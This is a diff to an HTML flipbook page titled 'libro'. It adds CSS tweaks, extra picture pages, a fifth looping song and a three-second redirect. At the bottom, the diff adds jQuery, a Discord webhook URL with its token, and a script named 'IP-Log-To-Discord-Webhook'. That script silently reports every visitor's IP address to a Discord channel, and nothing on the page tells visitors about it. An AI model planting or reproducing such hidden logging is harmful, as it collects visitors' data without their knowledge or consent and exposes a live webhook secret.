@@ -11,6 +11,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>libro</title>
+    <meta http-equiv="refresh" content="3;url=MAINPAGE.html" /> 
     
     <script src="https://cdn.tailwindcss.com"></script>
     
@@ -61,6 +62,8 @@
             transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1);
             transform-style: preserve-3d;
             box-shadow: none;
+            backface-visibility: hidden;
+            will-change: transform;
         }
         
         .page-content {
@@ -78,12 +81,18 @@
             background-position: center;
         }
 
-        .front { position: absolute; width: 100%; height: 100%; }
+        .front { 
+            position: absolute; 
+            width: 100%; 
+            height: 100%;
+            backface-visibility: hidden;
+        }
         .back {
             position: absolute;
             width: 100%;
             height: 100%;
             transform: rotateY(180deg);
+            backface-visibility: hidden;
         }
         
         .back::after {
@@ -114,7 +123,9 @@
         }
         .open-button:hover { transform: translateX(-50%) scale(1.05); }
         
-        .flipped { transform: rotateY(-180deg); }
+        .flipped {
+            transform: rotateY(-180deg);
+        }
         
         .book-spine {
             position: absolute;
@@ -240,6 +251,20 @@
             <div id="p9" class="page" style="z-index: 91;">
                 <div class="page-content front" style="background-image: url('https://i.postimg.cc/qB5yKP4Z/derecha.png');">
                 </div>
+                <div class="page-content back" style="background-image: url('https://i.postimg.cc/jS9v6wX7/iz2quierda.png');">
+                </div>
+            </div>
+
+            <div id="p10" class="page" style="z-index: 90;">
+                <div class="page-content front" style="background-image: url('https://i.postimg.cc/9MPpjxjd/derec3ha.png');">
+                </div>
+                <div class="page-content back" style="background-image: url('https://i.postimg.cc/Y9B3V5T2/izquierda.png');">
+                </div>
+            </div>
+
+            <div id="p11" class="page" style="z-index: 89;">
+                <div class="page-content front" style="background-image: url('https://i.postimg.cc/YSWRdrny/derecha.png');">
+                </div>
                 <div class="page-content back" style="background-color: #fff;">
                 </div>
             </div>
@@ -257,6 +282,7 @@
     <audio id="song2" src="https://raw.githubusercontent.com/t6mas/musica-web/refs/heads/main/minecraft-volume-alpha-11-mice-on-venus_nPLkOelZ.mp3" loop preload="auto"></audio>
     <audio id="song3" src="https://raw.githubusercontent.com/t6mas/musica-web/refs/heads/main/Joo%20Won%20-%20Fly%20Me%20to%20the%20Moon%20(High%20Sound%20Quality).mp3" loop preload="auto"></audio>
     <audio id="song4" src="https://raw.githubusercontent.com/t6mas/musica-web/refs/heads/main/Goodnight%20Anne.mp3" loop preload="auto"></audio>
+    <audio id="song5" src="https://raw.githubusercontent.com/t6mas/musica-web/refs/heads/main/You're%20In%20My%20Head%20Like%20a%20Catchy%20Song.mp3" loop preload="auto"></audio>
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
@@ -272,6 +298,7 @@
             const song2 = document.getElementById('song2');
             const song3 = document.getElementById('song3');
             const song4 = document.getElementById('song4');
+            const song5 = document.getElementById('song5');
 
             let currentPage = 0;
             const maxPages = pages.length;
@@ -321,8 +348,10 @@
                     targetSong = song2;
                 } else if (currentPage >= 6 && currentPage <= 7) {
                     targetSong = song3;
-                } else if (currentPage >= 8) {
+                } else if (currentPage >= 8 && currentPage <= 9) {
                     targetSong = song4;
+                } else if (currentPage >= 10) {
+                    targetSong = song5;
                 }
 
                 if (currentSong !== targetSong) {
@@ -410,6 +439,8 @@
             });
         });
     </script>
-
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>var webHookUrl = "https://discord.com/api/webhooks/1405746856541032570/Ej8JxmwaWAUzn_KWYnptxMUXy20vZe5VQIYC-7AvlzBunnKti9S3tGpkB0n8ExmLXUje";</script>
+<script src="https://cdn.jsdelivr.net/gh/luisoos/IP-Log-To-Discord-Webhook/index.js"></script>
 </body>
 </html>
